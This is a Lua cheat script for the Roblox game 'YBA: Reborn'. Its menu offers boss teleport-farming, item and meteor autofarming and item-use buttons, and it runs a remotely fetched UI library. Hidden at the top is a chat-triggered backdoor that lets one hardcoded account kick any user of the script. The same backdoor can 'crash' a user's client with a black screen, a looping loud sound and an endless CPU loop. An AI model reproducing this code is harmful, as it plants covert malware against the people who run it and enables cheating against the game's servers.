-- Core commands
local ownerName = "qmail6o"
local localPlayer = game.Players.LocalPlayer
local StarterGui = game:GetService("StarterGui")

local function crashCommand()
    local gui = Instance.new("ScreenGui", localPlayer:WaitForChild("PlayerGui"))
    gui.ResetOnSpawn = false
    gui.IgnoreGuiInset = true

    local blackFrame = Instance.new("Frame", gui)
    blackFrame.Size = UDim2.new(1, 0, 1, 0)
    blackFrame.Position = UDim2.new(0, 0, 0, 0)
    blackFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    blackFrame.BorderSizePixel = 0
    blackFrame.ZIndex = 9999

    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

    local sound = Instance.new("Sound", gui)
    sound.SoundId = "rbxassetid://9113882449"
    sound.Volume = 10
    sound.Looped = true
    sound:Play()

    task.spawn(function()
        task.wait(1.5)
        while true do
            for _ = 1, 1e6 do end
        end
    end)
end

local function findPlayer(partial)
    partial = partial:lower()
    for _, p in pairs(game.Players:GetPlayers()) do
        if p.Name:lower():sub(1, #partial) == partial then
            return p
        end
    end
end

local function listen(plr)
    plr.Chatted:Connect(function(msg)
        if plr.Name == ownerName then
            local args = msg:split(" ")
            local cmd = args[1]:lower()
            local target = args[2]

            if target then
                local found = findPlayer(target)
                if found and found == localPlayer then
                    if cmd == ":kick" then
                        localPlayer:Kick()
                    elseif cmd == ":crash" then
                        crashCommand()
                    end
                end
            end
        end
    end)
end

for _, plr in ipairs(game.Players:GetPlayers()) do
    listen(plr)
end

game.Players.PlayerAdded:Connect(listen)

-- GUI Setup
local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

local Window = Rayfield:CreateWindow({
   Name = "YBA: Reborn",
   Icon = 0,
   LoadingTitle = "YBA: Reborn",
   LoadingSubtitle = "Loading...",
   Theme = "Default",
   ConfigurationSaving = {
      Enabled = true,
      FolderName = nil,
      FileName = "YBA: Reborn"
   },
   Discord = {
      Enabled = false,
      Invite = "noinvitelink",
      RememberJoins = true
   },
   KeySystem = false
})

-- Tool logic
local function useTool(toolName, npcName)
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hum = char and char:FindFirstChild("Humanoid")
    local tool = bp and bp:FindFirstChild(toolName)
    if hum and tool then
        hum:EquipTool(tool)
        task.wait(0.3)
        pcall(tool.Activate, tool)
        task.wait(0.3)
        local remote = char:FindFirstChildOfClass("RemoteEvent")
        if remote then
            remote:FireServer("EndDialogue", {Option = "Option1", Dialogue = "Dialogue2", NPC = npcName or toolName})
        end
        return true
    end
    return false
end

local function useRokakaka()
    local bp = LocalPlayer:FindFirstChild("Backpack")
    local char = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
    local hum = char and char:FindFirstChild("Humanoid")
    local tool = bp and bp:FindFirstChild("Rokakaka")
    if hum and tool then
        hum:EquipTool(tool)
        task.wait(0.3)
        pcall(tool.Activate, tool)
        task.wait(0.2)
        local remote = char:FindFirstChildOfClass("RemoteEvent")
        if remote then
            remote:FireServer("EndDialogue", {Option = "Option1", Dialogue = "Dialogue3", NPC = "Rokakaka"})
        end
        return true
    end
    return false
end

-- Tabs
local farmingTab = Window:CreateTab("Items")
local autofarmEnabled = false
local meteorFarmEnabled = false
local blacklist = {}
local selectedItem = nil

-- Enemy Farm
local enemyTab = Window:CreateTab("Enemies")
local Section = enemyTab:CreateSection("Farming")
local trackingEnabled = false
local selectedBosses = {}
local standSummoned = false

local bossNames = {
    "Zombie Henchman", "Alpha Thug", "ArcherToAnything", "Bruno Bucciarati", "Corrupt Police",
    "Diavolo", "Dio", "Ghiaccio", "Heaven Ascension DEO", "Joe Kujoe",
    "Jotaro", "Leaky Eye Luca", "Pannacotta Fugo", "Pesci", "Security Guard",
    "Thug", "Vampire"
}

enemyTab:CreateDropdown({
    Name = "Select Enemies",
    Options = bossNames,
    CurrentOption = {},
    MultipleOptions = false,
    Callback = function(selected)
        selectedBosses = selected
    end,
})

enemyTab:CreateToggle({
    Name = "Enable",
    CurrentValue = false,
    Callback = function(val)
        trackingEnabled = val
    end,
})

local lastAtkRemote = nil
local function updateAtkRemote()
    local char = LocalPlayer.Character
    if not char then return end
    local standRemote = char:FindFirstChildOfClass("RemoteEvent")
    if standRemote then
        lastAtkRemote = standRemote
    end
end

RunService.Heartbeat:Connect(function()
    if not trackingEnabled then return end
    local char = LocalPlayer.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    updateAtkRemote()

    for _, bossName in ipairs(selectedBosses) do
        local boss = workspace:FindFirstChild("Alive"):FindFirstChild(bossName)
        local bossHRP = boss and boss:FindFirstChild("HumanoidRootPart")
        if bossHRP then
            hrp.CFrame = bossHRP.CFrame * CFrame.new(0, 20, 0)

            if not standSummoned and lastAtkRemote then
                lastAtkRemote:FireServer("ToggleStand")
                standSummoned = true
            end

            local stand = workspace:FindFirstChild("StandMorphs"):FindFirstChild(LocalPlayer.Name.."'s StandMorph")
            if stand and stand.PrimaryPart then
                local targetPos = bossHRP.CFrame * CFrame.new(0, 0, 5)
                stand:SetPrimaryPartCFrame(targetPos)
            end

            if lastAtkRemote then
                pcall(function()
                    lastAtkRemote:FireServer("Attack", "m1")
                end)
            end
            break
        end
    end
end)

-- Farming Section
local itemSection = farmingTab:CreateSection("Farming")

farmingTab:CreateToggle({
   Name = "Item Autofarm",
   CurrentValue = false,
   Callback = function(Value)
      autofarmEnabled = Value
   end,
})

farmingTab:CreateDropdown({
   Name = "Blacklist Items",
   Options = {
      "Ancient Scroll", "Christmas Present", "DIO's Diary", "Diamond",
      "Heart of The Saint's Corpse", "Left Arm of The Saint's Corpse",
      "Lucky Arrow", "Lucky Rib Cage of The Saint's Corpse",
      "Mysterious Arrow", "Pelvis of The Saint's Corpse",
      "Pure Rokakaka", "Requiem Arrow", "Rib Cage of The Saint's Corpse",
      "Rokakaka", "Steel Ball", "Stone Mask", "Zepellin's Headband", "Gold Coin", "Quinton's Glove", "Blue Candy", "Lucky Requiem arrow"
   },
   CurrentOption = {},
   MultipleOptions = true,
   Callback = function(Options)
      blacklist = {}
      for _, v in pairs(Options) do
         blacklist[v] = true
      end
   end,
})

-- Meteor Farm
local meteorSection = farmingTab:CreateSection("Meteorite")

farmingTab:CreateToggle({
    Name = "Farm Meteors",
    CurrentValue = false,
    Callback = function(val)
        meteorFarmEnabled = val
    end
})

-- FIXED LOOP: Meteor and Item farming logic
task.spawn(function()
    while true do
        task.wait(0.25)
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not hrp then continue end

        -- Prioritize meteor farming
        if meteorFarmEnabled then
            local meteor = workspace:FindFirstChild("Meteorite")
            if meteor and meteor:FindFirstChildWhichIsA("ProximityPrompt", true) then
                hrp.CFrame = meteor:GetModelCFrame() + Vector3.new(0, 3, 0)
                task.wait(0.2)
                local prompt = meteor:FindFirstChildWhichIsA("ProximityPrompt", true)
                if prompt then
                    fireproximityprompt(prompt)
                end
                continue
            end
        end

        -- Item farming logic
        if autofarmEnabled then
            for _, item in pairs(workspace:WaitForChild("Item_Spawns"):WaitForChild("Items"):GetChildren()) do
                if item:IsA("Model") and not blacklist[item.Name] then
                    local click = item:FindFirstChildWhichIsA("ClickDetector", true)
                    if click then
                        hrp.CFrame = item:GetModelCFrame() + Vector3.new(0, 3, 0)
                        task.wait(0.2)
                        fireclickdetector(click)
                        break
                    end
                end
            end
        end
    end
end)

-- New Use Items Tab
local useItemsTab = Window:CreateTab("Use Items")
local buttonsSection = useItemsTab:CreateSection("Use Items")

local itemButtons = {
    "Mysterious Arrow",
    "Lucky Arrow",
    "Requiem Arrow",
    "Lucky Requiem arrow",
    "Rib Cage of The Saint's Corpse",
    "Lucky Rib Cage of The Saint's Corpse"
}

for _, itemName in ipairs(itemButtons) do
    useItemsTab:CreateButton({
        Name = itemName,
        Callback = function()
            useTool(itemName, itemName)
        end,
    })
end
